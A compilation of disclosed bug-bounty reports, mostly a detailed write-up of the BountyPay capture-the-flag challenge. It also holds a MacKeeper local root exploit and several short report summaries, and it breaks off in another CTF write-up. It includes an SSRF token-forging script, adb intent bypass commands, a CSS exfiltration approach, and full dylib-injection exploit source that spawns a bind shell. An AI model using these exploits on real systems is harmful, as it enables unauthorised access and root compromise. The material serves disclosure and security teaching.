Apart from solving the CTF, my main goal on entering the Bug Bounty space (and also other different type of spaces) was to connect with people, make friends and have great collaborations.
This CTF has been great for all these aspects.

I would really like to thank you the following people:
- @mik317 for his invaluable support on the second-last step and for all the help he has been given to me during these months. This guy totally rocks.
- @nukedx for his astounding knowledge and will to help everyone.
- @al-madjus for having shared with me the last struggles of this CTF. I hope this will be an important collaboration also for the future.
- @d0nut for his essential article about CSS data exfiltration.

# THAT'S ALL FOLKS!

## Impact

Well, in this case the security impact is none as I helped all the hackers to be payed for all the bugs found in May!

Yeah, to do this I had to exploit several security issues, but that's another story... :D

---

### [[H1-2006 2020] Solution for the h1-2006 CTF challenge](https://hackerone.com/reports/891093)

- **Report ID:** `891093`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** h1-ctf
- **Reporter:** @thehackerish
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:28:40.581Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,
The flag is `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`. I didn't know I can send it prior to the report until I saw some disclosed solutions from the previous challenges.
The report will follow later today.

Regards
@thehackerish

## Impact

Multiple vulnerabilities on `*.bountypay.h1ctf.com` allow an unauthenticated remote attacker to access the BountyPay  customer application as `Marten Mickos` and pay May's bounties.

---

### [[H1-2006 2020]  Multiple vulnerabilities leading account takeover](https://hackerone.com/reports/887700)

- **Report ID:** `887700`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** h1-ctf
- **Reporter:** @nukedx
- **Bounty:** - usd
- **Disclosed:** 2020-06-17T23:33:03.714Z
- **CVE(s):** -

**Vulnerability Information:**

I'm posting flag and will send my write up upcoming days when I clear my mind after this rabbit holes! :D
`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

## Impact

Multiple vulnerabilities leading attacker to takeover any bounty pay user.

**Summary (researcher):**

## Start of events
On May 29th HackerOne announced via [twitter](https://twitter.com/Hacker0x01/status/1266454022124376064) that their lovely CEO *Mårten Mickos* needs to approve bounties on their new payment system called **BountyPay** but looks like he lost his login details and they asked help from the community.

So as a proud member of the community, I started to check what's **BountyPay** and visited their web page on https://bountypay.h1ctf.com/ for a visual reconnaissance, but that page from very start didn't look promising. They only had login links for their [customers] (https://app.bountypay.h1ctf.com/) and [staff] (https://staff.bountypay.h1ctf.com/)

Since all index pages nearly had zero info from visual reconnaissance except that they are using technologies like Bootstrap and jQuery there was nothing else. So started the initial reconnaissance process.

## Reconnaissance process and leaked credentials

As we all know reconnaissance is key feature for approaching to target and since I noticed **BountyPay** using different subdomains for staff and their customers, I wanted to see if there is any other subdomains available at all so for it I relied to [amass] (https://github.com/OWASP/Amass) which is really powerful subdomain enumeration and asset discovery tool and executed following:
`amass enum --passive -d bountypay.h1ctf.com` 

After few seconds results were like this:
{F850507}

So it looks like **BountyPay** had interesting subdomains like **api** and **software** but decided to check them later more after analyzing current initial subdomains **app** and **staff**

Therefore I started directory brute forcing on **app** via using [dirsearch](https://github.com/maurosoria/dirsearch) which is a nice tool for this job and executed it as following:

`python3 ~/dirsearch/dirsearch.py -u https://app.bountypay.h1ctf.com/ -e php,asp,aspx,jsp,html,zip,jar -b -w ~/dirsearch/db/dicc.txt -t 200 -x 502,503 -H 'X-FORWARDED-FOR: 127.0.0.1'` 

Since our target could be potentially behind WAF or has some rate limit assigned to IP address, we relied an old trick with using **X-Forwarded-For** header, after few seconds I noticed it found some interesting stuff under `.git` folder
{F850498}

So by using **curl** viewed contents of `.git/config`
`curl -sk https://app.bountypay.h1ctf.com/.git/config`

Response had some valuable information:
{F850501}

So visited `https://github.com/bounty-pay-code/request-logger/` and noticed it was public repository with file called `logger.php` there and it had following source:

{F850503}

It looks like developers of **BountyPay** were using it for trace logging, it was basically converting requests as json data and encoding them by using **base64** then saving it under `bp_web_trace.log` file

When I requested a file by using curl: `curl -sk https://app.bountypay.h1ctf.com/bp_web_trace.log`

Interestingly file was in present there with following data:
{F850502}
When I decoded **base64** values it became more interesting because it was leaking credentials for user called `brian.oliver`

Decoded values:
```json
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}
```

## Using leaked credentials and bypassing 2FA

Since we got some credentials to login, I straightly went for it and credentials was working but there was another problem to deal with which is called as 2FA
{F850499}

So I tried leaked 2FA answer `bD83Jk27dQ` which was fitting criteria of `aZ09` and 10 characters, unfortunately it didn't work well then checked the request done to the server with the help of [Burp Suite](https://portswigger.net/) which is a must have tool as bounty hunter and penetration tester.

{F850505} 

There was a parameter called `challenge_hash` which looked like a MD5 hash and surprisingly it wasn't on logs so giving the fact that hash was in present it must be used to verify `challenge_answer` which was actually the value I used from leaking credentials, given the fact that all combinations of `aZ09` which is already 62 elements and being 10 length, brute forcing would be unrealistic because it's 62^10 combinations which is equal to *839299365868340224* so there must be something else, then I decided to change value of `challenge_hash` to **5828c689761cce705a1c84d9b1a1ed5e** the MD5 value of `bD83Jk27dQ` and tried to login again, boom! bypassed the 2FA and we were in as Mr. Brian Oliver.

{F850523}

Dashboard of the customers looked very simple and they only had the option to view statements for a given time period. Unfortunately there was nothing on dashboard but something was interesting:

{F850510}

When the customer views the statements, the app was actually doing a request on **api.bountypay.h1ctf.com** and retrieving value back to us, that gave me an idea what if there is a SSRF? 


##Open redirect and SSRF
Since **api.bountypay.h1ctf.com** was used for api, I hoped it would have some documentation on it and on index of it there was a some valuable info, also it looked like api do not rely/need cookie from **app.bountypay.h1ctf.com**, so we are basically anonymous for api right now.

{F850476}

When we mouse over on `REST API` it was actually having `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API` as a link and that was a clear open redirect but there was some url whitelist as following
```
https://www.google.com/search?q=REST+API
https://bountypay.h1ctf.com/
https://api.bountypay.h1ctf.com/
https://software.bountypay.h1ctf.com/
https://staff.bountpay.h1ctf.com/
https://www.bountpay.h1ctf.com/
```
Interestingly it didn't have `https://app.bountypay.h1ctf.com` in the list but it's a gold in current state, the question is how can we force api to go `/redirect` endpoint and abuse it.

So I started to check URL return from statement viewing on api `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020`, it looks like we were able to control the query part of URL with our request on statement viewing, so tried a couple tricks to force URL parser to fail, it didn't.

Furthermore noticed **F8gHiqSdpK** which looked like our account value and our token looked like encoded as *base64* so when I decoded it:

```json
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

Yes **F8gHiqSdpK** was there with altering now I was able to do directory traversal, luckily they were not checking account value on cookie to verify session but **hash**

Since whitelist on domains were limited, it meant we can not exfiltrate metadata or similar stuff, neither view local services, then decided to check only remaining subdomain I didn't visit **software.bountypay.h1ctf.com**, it looks like our IP address was not allowed to access it.

{F850508}

So it felt like this is something I must use with SSRF then coded {F850470} for this purpose since SSRF was doable via token cookie.

```
#!/bin/bash
host="https://app.bountypay.h1ctf.com/statements?month=04&year=2020"
token=$(echo '{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/'$1'#","hash":"de235bffd23df6995ad4e0930baac1a2"}' | base64 -w 0 | awk {'print "token="$1'})
request=$(curl -sk $host -b $token)
if [[ ! $request == *" not found"* && ! $request == *"404 Not Found"* ]]; then
        data=$(echo $request | jq -c .data)
        url=$(echo $request | jq -c .url | cut -c 66- | cut -d "#" -f 1)
        now=$(date +"%T")
        echo "$url : $data"
fi
```
It is a simple tool which generates new token and uses it for SSRF on `https://software.bountypay.h1ctf.com`, thanks to **xargs** I was able to run it as multithreaded/multiprocess and for the wordlist I used [common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) 
`cat common.txt | xargs -P 30 -n 1 ./b64search.sh`

After few minutes I found out **uploads** folder
{F850458}

It was having some file directory listed as `/uploads/BountyPay.apk` but accessing the file with SSRF would be a pain and I hoped there was a permission issue and visited `https://software.bountypay.h1ctf.com/uploads/BountyPay.apk` and luckily, it started downloading.

## Android app and leaked token

So after downloading the APK file, I started to reverse engineering using [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF), a cool framework for mobile application testing. APK looked like it didn't have any public URL but firebase, so no hidden reconnaissance path was revealed with it.
I started my **Genymotion** and loaded APK with my virtual android device and continue viewing results from **MobSF**

Android manifest revealed there are some activities and they had schemes assigned to each other:
```xml
 <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="three" android:host="part" />
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="two" android:host="part" />
            </intent-filter>
        </activity>
        <activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="one" android:host="part" />
            </intent-filter>
        </activity>
```

It looks like APK has some intent checks and bypassing them would be easy, on PartOneActivity, it also hinted us at APK saving data on shared preferences for the process.
{F850451}

I was able to bypass PartOneActivity's intent checks with adb shell and using it as following:
`adb shell am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" -n bounty.pay/.PartOneActivity`

PartTwoActivity had similar checks:
{F850455}
Again using adb shell as following let me pass intent check:
`adb shell am start -a android.intent.action.VIEW -d "two://part?two=light\&switch=on" -n bounty.pay/.PartTwoActivity`

When we pass the check submit form appeared:
{F850456}

As we already figured from source of **PartTwoActivity**, it's checking for if the value we submit has `X-` at very beginning and there was some interesting hash on screen `459a6f79ad9b13cbcb5f692d2cc7a94d` which also looked like a MD5 hash, by querying it via [CrackStation](https://crackstation.net/), I was able to find it was MD5 hash value for `Token`, then entered `X-Token` as answer and proceeded to PartThreeActivity

PartThreeActivity also had some intent checks
{F850453}
This time things were looking a bit different since *base64* involved then I started to check other parts of PartThreeActivity and noticed there was some *base64* values located:
{F850452}

So when I decoded value of **directory** result was: `host`, and when decoded value of **directoryTwo** result was: `X-Token`

Intent check also was looking value we supplied for **three** and **switch** parameters as *base64* value of `PartThreeActivity` and `on` as respectively, so encoded `PartThreeActivity` and result was: `UGFydFRocmVlQWN0aXZpdHk=`, for `on` when encoded result was: `b24=` then executed following `adb shell` command:

`adb shell am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" -n bounty.pay/.PartThreeActivity`

I was able to pass intent check of PartThreeActivity and next step was checking hash value 
{F850454}

Since we already know APK was saving our process on shared preferences, I viewed details of with using adb shell as following:
`adb shell cat ./data/data/bounty.pay/shared_prefs/user_created.xml`

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="PARTTWO">COMPLETE</string>
    <string name="USERNAME">nukedx</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">mcipekci</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map>
```

Hash value needed was **8e9998ee3137ca9ade8f372739f062c1** by entering it I was able to complete APK challenge
{F850457}

CongratsActivity also had some valuable information which actually we figured out after viewing shared preferences.
{F850450}

Now we were having some token to use on **api.bountypay.h1ctf.com** 

## OSINT and getting staff credentials via API

After receiving token for API, started to directory brute force and only able to find few endpoints:
```
/api/accounts/{any}
/api/staff/
```
So API wasn't very talkative to us and looked like very limited with using token did simple `GET` request on `/api/staff` endpoint:
{F850432}

I was able to find staff details but they were only names and their staff ids, then wanted to test `POST` request on same endpoint, since we had `staff_id` parameter on previous request did some request like this:
{F850433}

It was giving error like **Staff Member already has an account**, since staff id's look like `STF:AZ09{10}` combination brute forcing a staff id which is not associated with account details would be hard, around same moments HackerOne made a retweet from handle **BountyPayHQ**
{F850427}

I start to check that handle and noticed they were celebrating a new team member called **Sandra**
{F850429}

She was not in the list of previously found staff members and started to check her twitter profile, interestingly she had some ID card with **BountyPay** logo on it, which was revealing her staff id.
{F850430}

Her staff id was `STF:8FJ3KFISL3` and tried `POST` request on `/api/staff` endpoint which let me get her credentials:
{F850431}

## Staff account and privilege escalation 

Since I found out login credentials for Sandra, logged in to her account on `https://staff.bountypay.h1ctf.com` but it looks like Sandra didn't have admin details.

Staff panel had some interesting javascript on `https://staff.bountypay.h1ctf.com/js/website.js`
{F850463}

It looks like admins can upgrade normal users on the staff system to admin as well and if there is a location hash on URL, javascript automatically triggers a click event for context assigned to them.

There was also report function for users to report pages they are on to admins or viewing but it strictly stated that: `Pages in the /admin directory will be ignored for security` so we can not use `/admin/upgrade?username=sandra.allison` for reporting too, so there must be a way to privilege escalation.

Since we know `#tab` classes auto clicks if there is a location hash with that class name we can combine multiple classes like `upgradeToAdmin tab2` but we must be able to find an injection point for it.

I realized that there was a update profile option and avatar we select is actually a class defined in cascading style sheet of page, so maybe we can trick server to have some other classes in our avatar, therefore I used inspect element option of my browser and edited value of **avatar2** and saved it:
{F850461}

After updating avatar went to ticket page and inspected avatar of Sandra:
{F850468}

So it was successful so decided to check if we can execute javascript with having location hash on URL:
{F850469}

It brought some problem username is send as undefined to server, so we must check if there is another endpoint which is having **username** input, since staff portal loading templates as query parameter, tried various potential template names and only one was having **username** input which is very first `login` template, then decided to check if there is any other endpoint unfortunately none.
{F850465}

Since we know **app.bountypay.h1ctf.com** was running as PHP, only potential thing left to try was sending query string parameter as array, since PHP can read query strings as is which means if we pass `param[]=value` as query string, param will read into array, so we will simply send `template[]=home` as first try to see if it loads page at all, and it was successful then wanted to try `template[]=login&template[]=ticket` in hope of template parameter handled as array too on app itself, result was successful as well now both templates loaded, I requested following page from server `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab2`
{F850460}

Now we can try to see if **username** sent as undefined or not:
{F850462}

Since report to admin function relies `url` variable located on page we must alter it, we could alter request by simply intercepting with any proxy as well but for such simple stuff, I decided to use developer tools:
{F850467}

It was executed properly:
{F850466}

So it was time to check home page of staff portal and see if we gained admin rights:
{F850464}

We were successfully escalated to admin rights and when viewing admin section noticed `marten.mickos` had their password available there as plain text
{F850459}

##Log in as Marten and pay all the bounties

It was incredible we find out *Mårten Mickos'* account details and now we can try login into it, looks like we had same 2FA process on very beginning of finding out login credentials for `brian.oliver` so by applying same logic, I was able to login his customer dashboard. after viewing current months statement, I noticed there was some unpaid bounties to our hacker friends:
{F850443}

It looks like **BountyPay** had extra layer of security so for approving payments we need another 2FA:
{F850434}

Interestingly this time there was some weird request which was having parameter called `app_style` in `POST` requests data
{F850435}

It looked like SSRF at glance was hitting any target I sent for but result was blind and since initial request had **css** as extension, this looked like either exfiltration data with CSS or some stored XSS, for eliminating stored XSS possibility, I tested simple payload like: `"><b>x</b>` and request I got on my collab server was having `"<>/` characters were sanitized and requested filename was looking like `file.extbxb`.

So I eliminated stored XSS, and checked next page of 2FA, realized this time it's 7 characters and trick we used on initial 2FA was not working so we must gain a 2FA code so went straightforward for exfiltration data with CSS, made {F850441} and started to send request to target.
{F850438} 

After some time revealed first 4 chars of input which was `code`: 
{F850442} 

So assumed input value was code and used {F850439} interestingly we were not getting any request at all, output for css from failed attempt was:
{F850440}

As we can see we directly used `=code` after altering it to `"^=code"`, we realized we were getting two hits this time:
{F850444}

Currently we were in misleading direction so we must figure out full input names, given habit of usage on `_` character, wanted to try `code_` as input value and we continued to get multiple requests after than figured out its sequential like `code_1` `code_2` etc and made {F850447}

I think we had some network problem had struggles like:
{F850448}

After few tries we were able to get first 6 characters for 2FA:
{F850446} 

For last char went for brute forcing with burp intruder and result was:
{F850437}

So we paid all the bounties to hackers :)

## Rabbit holes during event

1. `/pay/id/hash/` on `https://app.bountypay.h1ctf.com` forced us to believe there was an IDOR on early stages.
1. Login screen on `https://software.bountypay.h1ctf.com` 
1. Not being able to download APK due to permission :D
1. Since we were not expecting any OSINT in the first place, not being able to find any other endpoint on api was so annoying
1. Before realizing it was loading multiple templates with arrays, we realized each time updating profile was changing cookie value so thought we must decode cookie which was using some custom alphabet base64 and regular base64 over it which is really hard to achieve :D
1. Open redirect whitelist needs `/` at the end of URL which forced me and many other to believe there was something else :D
1.  `app_styles` param on the very last 2FA many believed it would be SSRF due to the user agent at first until they realized it's actually imitating a human being.

## After event findings

Since we always getting failed amount data with CSS exfiltration, realized it was actually due to not using **double quote** on input name and value and using `*~` in between of input and style, so it is actually causing some issues with chrome and not processing all styles, fixed php code for my PoC can be found on this [pastebin](https://pastebin.com/VnUrDx5T), since I already made two posts for attachments and didn't want to make another one.

Android APK is saving API token right after completing PartOneActivity, so other parts of the event could be skipped by a person who reads and analyzes entire codes :)

Open redirect whitelist for google is actually checking if `REST` is part of a query string so you can just use `https://www.google.com/?REST` :)

On first 2FA challenge you can ignore **challenge_answer** since it's not checking length of data send by user and directly push `d41d8cd98f00b204e9800998ecf8427e` as challenge hash which is md5 value of null :)

## Shoutouts

@ziot @superhero exchanging ideas with me during the event, @NahamSec @b3nac and @Adamtlangley for an amazing CTF.

@zeroxyele for letting me figure out issue with CSS exfiltration after finishing it as well during our convo for rabbit holes and issues encountered, he mentioned he was using [Jonathan Omisore's CSS keylogger](https://github.com/JonathanOmisore/CSS-Keylogging/blob/master/css-keylogger-extension/keylogger.css) so after viewing I realized issue for how Chromium was failing to handle CSS files.

I tried to make this write up as much as from my view and wanted to show using different tools and ways is possible to achieve the same results, instead of relying on one tool. I hope whoever reads this write up will enjoy it as much as I enjoyed the CTF and writing this up :)

---

### [Local Privilege escalation to root via XPC](https://hackerone.com/reports/750118)

- **Report ID:** `750118`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Clario
- **Reporter:** @r3ggi-on-h1
- **Bounty:** - usd
- **Disclosed:** 2020-06-14T07:01:05.656Z
- **CVE(s):** -

**Summary (team):**

### Summary
The application is divided into a few parts responsible for different actions. The standard, running with user permissions parts are:

MacKeeper
MacKeeperAgent MacKeeper communicates with more privileged (root) part named com.mackeeper.MacKeeperPrivilegedHelper that is located in the /Library/PrivilegedHelperTools/ directory. The communication is done via the NSXPC mechanism.
While establishing the connection, the com.mackeeper.MacKeeperPrivilegedHelper has to ensure that the connecting process is the MacKeeperAgent in order to mitigate privilege escalation bugs. To do so, the -[MKKeenowVPN listener:shouldAcceptNewConnection:] method is used. Inside that method, you check if the connecting process has been signed with the same Developer Certificate that com.mackeeper.MacKeeperPrivilegedHelper was.

The problem is that an attacker is able to inject a malicious code into validly signed MacKeeper executable file via DYLD_INSERT_LIBRARIES environment variable and establish a valid XPC connection.

### Steps to reproduce
To prepare this PoC I downloaded older version of MacKeeper (4.6.2) that has no 'Hardened Runtime' capability turned on but is still signed with the same Developer Certificate. Note, that we're going to connect to the newest version of Mackeeper.
After we downloaded a 'trampoline' executable, we need to prepare a malicious dynamic library that we are going to inject. The code below:

```
#import <Foundation/Foundation.h>

@protocol MKIKeenowVPN
@property(readonly, nonatomic) BOOL available;
- (void)resetPassword:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;
- (void)closeClientWithEmail:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;
- (void)getAccountExpDateWithCallBack:(void (^)(NSDate *, unsigned long long))arg1;
- (void)getAccountCredentialWithCallBack:(void (^)(NSString *, NSString *, unsigned long long))arg1;
- (void)getAccountTypeWithCallBack:(void (^)(NSString *, unsigned long long))arg1;
- (void)loginWithEmail:(NSString *)arg1 password:(NSString *)arg2 callback:(void (^)(unsigned long long))arg3;
- (void)addClientWithEmail:(NSString *)arg1 password:(NSString *)arg2 countryCode:(NSString *)arg3 type:(NSString *)arg4 callback:(void (^)(unsigned long long))arg5;
- (void)setEncryptionType:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;
- (void)checkAESSupportWithCallback:(void (^)(BOOL))arg1;
- (void)retrieveBandwidthForServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;
- (void)pingServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long, unsigned long long, unsigned long long))arg2;
- (void)checkOpenPortWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(BOOL))arg4;
- (void)retrieveVPNStatusWithCallback:(void (^)(BOOL, unsigned long long))arg1;
- (void)stopVPNConnectionWithCallback:(void (^)(unsigned long long))arg1;
- (void)startVPNConnectionWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(unsigned long long))arg4;
- (void)getServerListWithCallback:(void (^)(NSArray *, unsigned long long))arg1;
- (void)finalize;
- (void)initializeWithOpenVPNPath:(NSString *)arg1 callback:(void (^)(BOOL))arg2;
@end

@protocol MKIKeenowVPNObserver
- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1;
- (void)privilegedVPNStateDidChange:(unsigned long long)arg1;
@end

@interface MacKeeperMaliciousLibrary : NSObject <MKIKeenowVPNObserver>
- (void)startXPCConnection;
@end

@implementation MacKeeperMaliciousLibrary
- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1 {
    NSLog(@"[+] privilegedVPNIOCountDidChange CALLED with %llu", arg1);
}
- (void)privilegedVPNStateDidChange:(unsigned long long)arg1 {
    NSLog(@"[+] privilegedVPNStateDidChange CALLED with %llu", arg1);
}
- (instancetype)init
{
    self = [super init];
    if (self) {
        [self startXPCConnection];
    }
    return self;
}
- (void)startXPCConnection {
    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPN)];
    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.mackeeper.MacKeeperPrivilegedHelperMKIKeenowVPN.mach" options:NSXPCConnectionPrivileged];
    xpcConnection.remoteObjectInterface = remoteInterface;
    xpcConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPNObserver)];
    xpcConnection.exportedObject = self;

    xpcConnection.interruptionHandler = ^{
        NSLog(@"Connection Terminated");
    };

    xpcConnection.invalidationHandler = ^{
        NSLog(@"Connection Invalidated");
    };

    [xpcConnection resume];

    [xpcConnection.remoteObjectProxy initializeWithOpenVPNPath:@"/tmp/rootshell.sh" callback:^(BOOL success) {
        NSLog(@"initializeWithOpenVPNPath? %d", success);
    }];

    sleep(1);

    [xpcConnection.remoteObjectProxy startVPNConnectionWithIP:@"127.0.0.1" protocol:@"TCP" port:@"8888" callback:^(unsigned long long success) {
        NSLog(@"startVPNConnectionWithIP? %llu", success);
    }];

    sleep(1);
}

@end

__attribute__((constructor)) static void pwn() {

    NSString *rootshell = @"/usr/local/bin/python3 -c \"import os;import pty;import socket;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('127.0.0.1', 31337));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn('/bin/bash');s.close()\"";
    [rootshell writeToFile:@"/tmp/rootshell.sh" atomically:YES encoding:NSUTF8StringEncoding error:nil];

    NSLog(@"[!] DYLIB SUCCESSFULLY INJECTED");
    [MacKeeperMaliciousLibrary new];
    exit(-3);
}
```
Compile the lib using gcc:
```
gcc -dynamiclib malicious_library.m -o libMacKeeperMaliciousLibrary.dylib -lobjc -framework Foundation
```

Run following command:
```
DYLD_INSERT_LIBRARIES=./libMacKeeperMaliciousLibrary.dylib ./MacKeeper_old.app/Contents/MacOS/MacKeeper
```

If the exploit succeeded the rootshell should be spawned (screen attached). If not, try to kill `com.mackeeper.MacKeeperPrivilegedHelper` and immediately run the exploit again.

---

### [able to login into login.topechelon.com](https://hackerone.com/reports/712318)

- **Report ID:** `712318`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Top Echelon Software
- **Reporter:** @darkshadow1733
- **Bounty:** - usd
- **Disclosed:** 2020-05-20T14:49:35.657Z
- **CVE(s):** -

**Summary (team):**

The support login for our administrative account was using insecure credentials, allowing access to our administrative account. These credentials are not used, so we chose to deactivate the login to prevent access.

---

### [Subdomain Takeover uptime](https://hackerone.com/reports/824909)

- **Report ID:** `824909`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** BTFS
- **Reporter:** @ahmed_alwardani
- **Bounty:** 100 usd
- **Disclosed:** 2020-05-05T20:50:32.622Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team:

i can't report it to the company so i hope to accept it as a valid bug , i found subdomain takeover in your subdomain ```uptime.btfs.io``` , i found this subdomain pointed to uptimerobot and not claimed so i signedup in uptimerobot and claimed it.

POC:
------

1 - open https://uptime.btfs.io/
2 - you need a password to login ```A123456789```
3 - {F753695}

## Impact

- Subdomain takeover can be abused to do several things like :
Malware distribution
Phishing / Spear phishing
XSS
Authentication bypass
Legitimate mail sending and receiving on behalf of ford subdomain

---

### [UniFi Video web interface Configuration Restore user privilege escalation](https://hackerone.com/reports/329659)

- **Report ID:** `329659`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ubiquiti Inc.
- **Reporter:** @ajxchapman
- **Bounty:** - usd
- **Disclosed:** 2020-04-01T17:38:43.269Z
- **CVE(s):** CVE-2020-8145

**Summary (team):**

Summary of the issue:
Low privileged UniFi Video users can abuse the Configuration Restore functionality to modify any application configuration setting, including creating new administrative users.

Details:
The UniFi Video Server (Windows) web interface configuration restore functionality at the “backup” and “wizard” endpoints does not implement sufficient privilege checks. Low privileged users, belonging to the PUBLIC_GROUP or CUSTOM_GROUP groups, can access these endpoints and overwrite the current application configuration. This can be abused for various purposes, including adding new administrative users.

More details about this vulnerability and the fixes can be found here: https://community.ui.com/releases/Security-advisory-bulletin-006-006/3cf6264e-e0e6-4e26-a331-1d271f84673e

---

### [Able to Become Admin for Any LINE Official Account](https://hackerone.com/reports/698579)

- **Report ID:** `698579`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** LY Corporation
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2020-03-25T05:43:54.131Z
- **CVE(s):** -

**Summary (team):**

The reporter found an issue where abusing an IDOR would allow for an attacker to become an administrator of any LINE Official Account. This was due to an issue where the group ID could be extracted and/or easily guessed, combined with lack of authentication, leading to being able to craft a request that resulted in being given administration rights to that LINE Official Account.

---

### [Subdomain Takeover at creatorforum.roblox.com](https://hackerone.com/reports/264494)

- **Report ID:** `264494`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Roblox
- **Reporter:** @jackb898
- **Bounty:** - usd
- **Disclosed:** 2020-03-24T19:57:37.210Z
- **CVE(s):** -

**Vulnerability Information:**

Hello.

A few days ago, I was looking at Roblox subdomains, and I noticed an unusual one called creatorforum.roblox.com. Upon further investigation, I visited it and saw that creatorforum.roblox.com's CNAME was a nonexistant Discourse website.
 I immediately reported to info@roblox.com, and eventually talked to Antek Baranski on the bugbounty@roblox.com email address. The issue has been fixed since reporting, but I was told to send a report here.

If I had a Discourse account, I could've taken over the CNAME for creatorforum.roblox.com and then it would've been a full subdomain takeover on that subdomain.

As mentioned earlier in the report, the issue has been resolved and as you can see the subdomain creatorforum.roblox.com no longer exists.


Thanks,
Jack

**Summary (researcher):**

creatorforum.roblox.com was pointing to a nonexistent Discourse website allowing for a subdomain takeover to occur. Thank you to the roblox team for quickly resolving this and awarding me a bounty.

---

### [China - president-starbucks.com.cn DNS configuration reported as takeover](https://hackerone.com/reports/423269)

- **Report ID:** `423269`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @k3mlol
- **Bounty:** - usd
- **Disclosed:** 2020-03-17T21:29:28.530Z
- **CVE(s):** -

**Summary (team):**

k3mlol discovered that president-starbucks.com.cn was displaying Chinese gambling content, reporting it as a takeover. It was ultimately determined to be a released resource, no longer owned by Starbucks. This report was awarded a bounty in error; Future reports against this domain would not qualify for eligibility.

@k3mlol — thank you for reporting this vulnerability.

---

### [[h1-415 2020] @_bayotop h1-415-ctf writeup](https://hackerone.com/reports/779113)

- **Report ID:** `779113`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** h1-ctf
- **Reporter:** @bayotop
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T22:32:09.744Z
- **CVE(s):** -

**Vulnerability Information:**

## TL;DR:

Thanks for the challenge!

1. Abusing account recovery via QR codes to get access to jobert@mydocz.cosmic.
2. Blind XSS in `/support/review/<review_id>` (including CSP bypass).
3. Missing input sanitization on `name` parameter when POSTing to `/support/review/<review_id>`.
4. Access to remote debugging port on local Chrome instance leaking ID of secret document.
5. **h1ctf{y3s_1m_c0sm1c_n0w}**

I also included a python script F691360 which is going through the whole challenge (it's a result of a number of scripts I used to automate repetitive tasks).

## Details

### Introduction

https://h1-415.h1ctf.com hosted a simple web application allowing to convert images into PDF files. Anyone could register a trial account. Signing in would give access to the converter and basic account management which allowed only a name change. The converter allowed to upload JPG and PNG files only. The resulting PDF would include the uploaded image and the user's name.

### Step 1 - One '{' is all it takes.

